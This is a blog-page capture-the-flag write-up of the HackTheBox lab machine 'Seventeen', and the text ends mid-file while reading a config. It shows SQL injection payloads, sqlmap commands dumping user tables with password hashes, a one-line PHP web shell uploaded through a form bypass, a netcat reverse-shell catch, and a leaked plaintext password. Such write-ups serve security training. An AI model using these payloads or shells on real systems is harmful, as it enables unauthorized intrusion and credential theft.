<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Seventeen ::
        Werz â€” CyberSecurity
      </title>
    
    <head>
  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>


</head>

<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="The official box page on HTB
The writeup: #  System Scan | IP: 10.10.11.146 #  let&amp;rsquo;s add the ip to to the /etc/hosts file and name it seventeen.htb
 echo &#39;10.10.11.146 seventeen.htb &#39; &amp;gt;&amp;gt; /etc/hosts
 Startup a nmap scan | -sC for the default set of scripts. | -sV version detection. | -T4 traffic speed.
 nmap -sC -sV -T4 10.10.11.146
 werz@ctf01:~/ctf/htb/seventenn$ nmap -sC -sV -T4 10."
/>

<meta
  name="keywords"
  content="ctf, hackthebox, writeup, htb writeup, walkthrough, retired htb, hack the box, cybersecurtiy, capture the flag"
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://0xwerz.github.io/01/01/1/seventeen/" />
<meta content="Posts about Cybersecurity, Pentesting, CTF writeups, and more" property="og:description" />
<meta content="https://0xwerz.github.io/" property="og:url" />
<meta content="Werz         Cybersecurity content, And more" property="og:title" />





<link rel="stylesheet" href="https://0xwerz.github.io/assets/style.css" />

<link rel="stylesheet" href="https://0xwerz.github.io/style.css" />


<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png%20%7c%20absURL">
<link rel="icon" type="image/png" sizes="32x32" href="img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="img//android-chrome-192x192.png">
<link rel="manifest" href="img/site.webmanifest">
<link rel="mask-icon" href="img/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">


<link href="https://0xwerz.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://0xwerz.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Seventeen"/>
<meta name="twitter:description" content="https://app.hackthebox.com/machines/seventeen"/>



<meta property="og:title" content="Seventeen" />
<meta property="og:description" content="https://app.hackthebox.com/machines/seventeen" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xwerz.github.io/01/01/1/seventeen/" /><meta property="article:section" content="posts" />

<meta property="og:site_name" content="Werz" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="https://0xwerz.github.io/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >werz@blog:~$</span
    >
    <span class="logo__cursor"></span>
  
</a>
    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/archive">./archive</a></li>
        
      
        
          <li><a href="/posts">./articles</a></li>
        
      
        
          <li><a href="/about">./whoami</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/archive">./archive</a></li>
      
    
      
        <li><a href="/posts">./articles</a></li>
      
    
      
        <li><a href="/about">./whoami</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Seventeen</h1>
    <div class="post-meta">
      

      


      
        <span class="post-read-time"
          >â€” 15 min read</span
        >
      
    </div>

    
      <span class="post-tags">
        
          <a href="https://0xwerz.github.io/tags/htb/">#htb</a>&nbsp;
        
          <a href="https://0xwerz.github.io/tags/linux/">#linux</a>&nbsp;
        
          <a href="https://0xwerz.github.io/tags/hard/">#hard</a>&nbsp;
        
          <a href="https://0xwerz.github.io/tags/retired/">#retired</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      
      <p>The official <a href="https://app.hackthebox.com/machines/seventeen" target="_blank">box page</a>
 on HTB</p>
<img src="https://github.com/0xWerz/CTF-writeups/raw/main/HTB/Machines/seventeen/img/seventeen.png" style="border-radius: 3%;" alt="">
<h3 id="the-writeup">
  The writeup:
  <a href="#the-writeup" class="h-anchor" aria-hidden="true">#</a>
</h3>
<h4 id="system-scan--ip-101011146">
  System Scan | <strong>IP: 10.10.11.146</strong>
  <a href="#system-scan--ip-101011146" class="h-anchor" aria-hidden="true">#</a>
</h4>
<p>let&rsquo;s add the ip to to the <code>/etc/hosts</code> file and name it <code>seventeen.htb</code></p>
<blockquote>
<p><code>echo '10.10.11.146    seventeen.htb ' &gt;&gt; /etc/hosts</code></p>
</blockquote>
<p>Startup a nmap scan | <strong>-sC for the default set of scripts</strong>. | <strong>-sV version detection</strong>. | <strong>-T4 traffic speed</strong>.</p>
<blockquote>
<p><code>nmap -sC -sV -T4 10.10.11.146</code></p>
</blockquote>
<pre tabindex="0"><code>werz@ctf01:~/ctf/htb/seventenn$ nmap -sC -sV -T4 10.10.11.165 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-02 06:42 +01
Nmap scan report for seventeen.htb (10.10.11.165)
Host is up (0.086s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Let's begin your education with us! 
8000/tcp open  http    Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.3; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
</code></pre><h2 id="open-ports">
  Open Ports
  <a href="#open-ports" class="h-anchor" aria-hidden="true">#</a>
</h2>
<table>
<thead>
<tr>
<th>Ports</th>
<th>Service</th>
<th>Takeaways</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH</td>
<td>OpenSSH 7.6p1</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>Apache httpd 2.4.29</td>
</tr>
<tr>
<td>8000</td>
<td>HTTP</td>
<td>Apache httpd 2.4.38</td>
</tr>
</tbody>
</table>
<h2 id="enumeration--webpage---port-80">
  Enumeration | Webpage - port 80
  <a href="#enumeration--webpage---port-80" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p><img src="./img/webpage.png" alt="Timelapse_banner"></p>
<p>At the top we see <code>seventeen.htb</code>. I&rsquo;ll add that to my <code>/etc/hosts</code> file.</p>
<p>I&rsquo;ll give time for directory fuzzing. I&rsquo;m using <a href="https://github.com/epi052/feroxbuster" target="_blank">feroxbuster</a>
.</p>
<pre tabindex="0"><code>feroxbuster -u http://seventeen.htb 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &quot;epi&quot; Risher ğŸ¤“                 ver: 2.7.1
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://seventeen.htb
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ğŸ‘Œ  Status Codes          â”‚ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.7.1
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</code></pre><h2 id="webpage---port-8000">
  Webpage - port 8000
  <a href="#webpage---port-8000" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p><img src="./img/webpage_port_8000.png" alt="second webpage"></p>
<p>I&rsquo;ll run a directory fuzzing also.</p>
<pre tabindex="0"><code>feroxbuster -u http://10.10.11.165:8000
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben &quot;epi&quot; Risher ğŸ¤“                 ver: 2.7.1
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://10.10.11.165:8000
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ğŸ‘Œ  Status Codes          â”‚ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.7.1
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
403      GET        9l       28w      280c http://seventeen.htb:8000/
403      GET        9l       28w      280c http://seventeen.htb:8000/server-status
[####################] - 1m     60000/60000   0s      found:2       errors:0      
[####################] - 59s    30000/30000   501/s   http://seventeen.htb:8000 
[####################] - 55s    30000/30000   543/s   http://seventeen.htb:8000/ 
</code></pre><p>Nothing seems interesting execpt the server-status endpoint that is Forbidden/403 also.</p>
<p>I&rsquo;ll go with a subdomain fuzz. I&rsquo;ll use <a href="https://github.com/ffuf/ffuf" target="_blank">fuff</a>
</p>
<pre tabindex="0"><code>ffuf -u FUZZ.seventeen.htb -w D:\Downloads\SecLists\Discovery\DNS\subdomains-top1million-110000.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : FUZZ.seventeen.htb
 :: Wordlist         : FUZZ: D:\Downloads\SecLists\Discovery\DNS\subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 114441 ::
PS C:\Users\werz&gt; ffuf -u http://FUZZ.seventeen.htb -w D:\Downloads\SecLists\Discovery\DNS\subdomains-top1million-110000.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.seventeen.htb
 :: Wordlist         : FUZZ: D:\Downloads\SecLists\Discovery\DNS\subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 344ms]0 ::
:: Progress: [1720/114441] :: Job [1/1] :: 872 req/sec :: Duration: [0:00:20] :: Errors: 1679 :::
</code></pre><p>And we got one <code>exam</code>. let&rsquo;s check it out by adding it to the hosts file. <code>/etc/hosts</code></p>
<p><img src="./img/exam_sub.png" alt="exam_webapge"></p>
<p>The web site seems hosting a exam Management System.</p>
<p>Clicking the admin href link direct us to <code>/admin/login.php</code> so it may be a php webpage.</p>
<p>the <code>Exams</code> href seems interesting also <code>/?p=exams</code> we may should inject some payloads here.</p>
<p>Well, if we search for <code>Exam Reviewer Management</code> on <a href="https://www.exploit-db.com/" target="_blank">exploit-db</a>
 we&rsquo;ll end up with two cool results:</p>
<p><img src="./img/exploit_db_search.png" alt="exploit_db_search"></p>
<p>I&rsquo;ll start with the sqli/50725 one</p>
<h3 id="poc">
  POC:
  <a href="#poc" class="h-anchor" aria-hidden="true">#</a>
</h3>
<pre tabindex="0"><code>
Parameter: id (GET)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause

Payload: p=take_exam&amp;id=1' AND 4755=4755 AND 'VHNu'='VHNu



Type: error-based

Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY
clause (FLOOR)

Payload: p=take_exam&amp;id=1' OR (SELECT 8795 FROM(SELECT
COUNT(*),CONCAT(0x71766a7071,(SELECT
(ELT(8795=8795,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'MCXA'='MCXA



Type: time-based blind

Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)

Payload: p=take_exam&amp;id=1' AND (SELECT 2206 FROM (SELECT(SLEEP(5)))AhEo)
AND 'vqGg'='vqGg---



*SQLMAP COMMAND*



*# sqlmap -u &quot;127.0.0.1/erms/?p=take_exam&amp;id=1
&lt;http://127.0.0.1/erms/?p=take_exam&amp;id=1&gt;&quot; -p id --dbs --level 3*
</code></pre><p>I&rsquo;ll pass the request <code>http://exam.seventeen.htb/?p=take_exam&amp;id=1' AND 4755=4752 AND 'VHNu'='VHNu</code> It may work.</p>
<p><img src="./img/sqli1.png" alt="sqli_1"></p>
<p>If we lower the value of <code>4755=4755</code> <code>4755=4754</code> we&rsquo;ll get a alert</p>
<p><img src="./img/sqli2.png" alt="sqli2"></p>
<p>So based on this behavior it should be a boolean-based SQL injection.</p>
<p>I&rsquo;ll automate it with <a href="https://github.com/sqlmapproject/sqlmap" target="_blank">sqlmap</a>
</p>
<blockquote>
<p>sqlmap.py &ndash;technique B -u &lsquo;<a href="http://exam.seventeen.htb/?p=take_exam&amp;id=1%27" target="_blank">http://exam.seventeen.htb/?p=take_exam&amp;id=1&#39;</a>
 -p id &ndash;batch</p>
</blockquote>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>&ndash;technique B</td>
<td>boolean-based</td>
<td></td>
</tr>
<tr>
<td>-p</td>
<td>specific param</td>
<td></td>
</tr>
<tr>
<td>&ndash;batch</td>
<td>non-interactive session</td>
<td></td>
</tr>
</tbody>
</table>
<pre tabindex="0"><code>sqlmap.py -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.9.3#dev}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:35:34 /2022-09-29/

[16:35:35] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=6576f096723...b079104033'). Do you want to use those [Y/n] Y
[16:35:36] [INFO] testing if the target URL content is stable
[16:35:36] [INFO] target URL content is stable
[16:35:36] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[16:35:37] [INFO] testing for SQL injection on GET parameter 'id'
[16:35:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:35:42] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=&quot;This&quot;)
[16:36:12] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests
[16:36:12] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
[16:37:42] [CRITICAL] connection timed out to the target URL
[16:37:51] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:37:51] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 25 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: p=take_exam&amp;id=1' AND 3991=3991 AND 'MTpX'='MTpX
---
[16:37:54] [INFO] testing MySQL
[16:37:54] [INFO] confirming MySQL
[16:37:55] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP, PHP 7.2.34
back-end DBMS: MySQL &gt;= 5.0.0
[16:37:56] [INFO] fetched data logged to text files under '/home/werz/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 16:37:56 /2022-09-29/
</code></pre><p>Indeed!, we got it working. Let&rsquo;s dump the content now. <code>--dbs</code> for dumping databases</p>
<pre tabindex="0"><code>sqlmap.py --dbs -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch
&lt;
[16:49:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.2.34, Apache 2.4.38, PHP
back-end DBMS: MySQL 5
[16:49:52] [INFO] fetching database names
[16:49:52] [INFO] fetching number of databases
[16:49:52] [INFO] resumed: 4
[16:49:52] [INFO] retrieving the length of query output
[16:49:52] [INFO] retrieved: 18
[16:50:04] [INFO] retrieved: information_schema
[16:50:04] [INFO] retrieving the length of query output
[16:50:04] [INFO] retrieved: 7
[16:50:11] [INFO] retrieved: db_sfms
[16:50:11] [INFO] retrieving the length of query output
[16:50:11] [INFO] retrieved: 7
[16:50:18] [INFO] retrieved: erms_db
[16:50:18] [INFO] retrieving the length of query output
[16:50:18] [INFO] retrieved: 11
[16:50:26] [INFO] retrieved: roundcubedb
available databases [4]:
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb
</code></pre><p>Iâ€™ll start with <code>erms_db</code> database.</p>
<pre tabindex="0"><code>sqlmap.py --tables -D erms_db -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch --threads 10
&lt;
[6 tables]
+---------------+
| category_list |
| exam_list     |
| option_list   |
| question_list |
| system_info   |
| users         |
+---------------+
&lt;
</code></pre><p>6 tables are here, I&rsquo;ll dump the users table, we may retrieve some hashes.</p>
<pre tabindex="0"><code>sqlmap.py -D erms_db -T users --dump -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch --threads 10
&lt;

Database: erms_db
Table: users
[3 entries]
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+

&lt;

</code></pre><p>Trying to crack these md5 hashes with <a href="https://crackstation.net/" target="_blank">crackstation</a>
 but with no help. if we focus on the avatar path <code>../oldmanagement/files/</code>, it seems to be another vhost, if we say that <code>erms</code> live in <code>/var/www/emrs</code>, then avatars are aimed back to <code>/var/www/oldmanagement</code>. Let&rsquo;s check it then. add <code>oldmanagement.seventeen.htb</code> to the hosts file <code>/etc/hosts</code></p>
<p>So yeah, we got a response back after redirecting us to port 8000:
<img src="./img/oldmanagement_webpage.png" alt="oldmanagement_webpage"></p>
<p>School File Management System seems to be a short form of db_sfms database, So let&rsquo;s dump it we might retrieve some login credentials.</p>
<pre tabindex="0"><code>sqlmap -D db_sfms --tables -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch --threads 10
&lt;
Database: db_sfms
[3 tables]
+---------+
| user    |
| storage |
| student |
+---------+
&lt;
</code></pre><p>Since I&rsquo;m trying to log in, I&rsquo;ll dump the user table. we might retrieve some crackable hashes</p>
<pre tabindex="0"><code>sqlmap.py -D db_sfms -T user --dump -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch --threads 10
&lt;
Database: db_sfms
Table: user
[3 entries]
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| user_id | status        | lastname      | password                         | username         | firstname     |
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
| 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
| 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
+---------+---------------+---------------+----------------------------------+------------------+---------------+
&lt;
</code></pre><p>There&rsquo;s no student number in this table, let&rsquo;s dump the <code>student</code> table then.</p>
<pre tabindex="0"><code>sqlmap.py -D db_sfms -T student --dump -u 'http://exam.seventeen.htb/?p=take_exam&amp;id=1' -p id --technique B --batch --threads 10
&lt;
Database: db_sfms
Table: student
[4 entries]
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
&lt;
</code></pre><p>And let&rsquo;s try cracking these hashes on <a href="https://crackstation.net/" target="_blank">crackstation</a>
</p>
<p><img src="./img/hash_crack_01.png" alt="cracked_hash"></p>
<p>kelly Shane with the 31234 number is crackable and <code>autodestruction</code> as a result. let&rsquo;s login then!</p>
<p>And we are in:</p>
<p><img src="./img/sfms_page.png" alt="after_login_page"></p>
<p>Theres a upload and a download button.</p>
<h2 id="www-data-shell">
  www-data shell
  <a href="#www-data-shell" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>If we download the pdf file <code>Marksheet-finals.pdf</code> nothing appear interesting, let&rsquo;s try upload something, I&rsquo;ll upload the same pdf file, just to see where it might be saved.</p>
<p>After some manual enumeration, I see that the uploaded files are saved in  <code>/files/&lt;student-number&gt;/&lt;filesname&gt;</code> in my case I can retrive the file in <code>/files/31234/Marksheet-finals.pdf</code></p>
<p>We can be sure also by checking the <a href="https://www.sourcecodester.com/php/14155/school-file-management-system.html" target="_blank">source-code</a>
 though.</p>
<p><img src="./img/public_upload_path.png" alt="public-upload-path"></p>
<p>I&rsquo;ll upload a php reverse shell. with the following content:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p><img src="./img/php_rev_forbidden01.png" alt="forbidden-response"></p>
<p>we can see that the file is uploaded fine, but is blocked. I&rsquo;ll interecpt the upload form with burp to see if we can playaround with it params.</p>
<p><img src="./img/burp_upload.png" alt="burp-upload"></p>
<p>What if change the student number, we might overide another directory and avoid the php execute block.</p>
<p>I&rsquo;ve changed <code>31234</code> to <code>31235</code></p>
<p><img src="./img/student_number_change.png" alt="student_number_change"></p>
<p><img src="./img/id_execute.png" alt="id_execute"></p>
<p>And we got a RCE!</p>
<p>I&rsquo;ll request a reverse shell after a nc listener:</p>
<p><img src="./img/rev_payload.png" alt="rev-shell"></p>
<pre tabindex="0"><code>nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.48] from (UNKNOWN) [10.10.11.165] 58730
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c5d1cc2e5e93:/var/www/html/oldmanagement/files/31235$
</code></pre><h2 id="mark-shell--user">
  mark shell | user
  <a href="#mark-shell--user" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>I&rsquo;ll stabilize my shell:</p>
<blockquote>
<p>python -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
</blockquote>
<blockquote>
<p>export TERM=xterm</p>
</blockquote>
<p>For users:</p>
<pre tabindex="0"><code>www-data@c5d1cc2e5e93:/var/www/html/oldmanagement/files/31235$ cat /etc/passwd | grep sh$
 grep sh$passwd |
root:x:0:0:root:/root:/bin/bash
mark:x:1000:1000:,,,:/var/www/html:/bin/bash
</code></pre><p>After some time with checking files for leaking passwords, we got <code>got2020bestyearofmylife</code> password in <code>/var/www/html/employeemanagementsystem/process/dbh.php</code></p>
<pre tabindex="0"><code>www-data@c5d1cc2e5e93:/var/www/html/employeemanagementsystem$ cat process/dbh.php
pat process/dbh.php
&lt;?php

$servername = &quot;localhost&quot;;
$dBUsername = &quot;root&quot;;
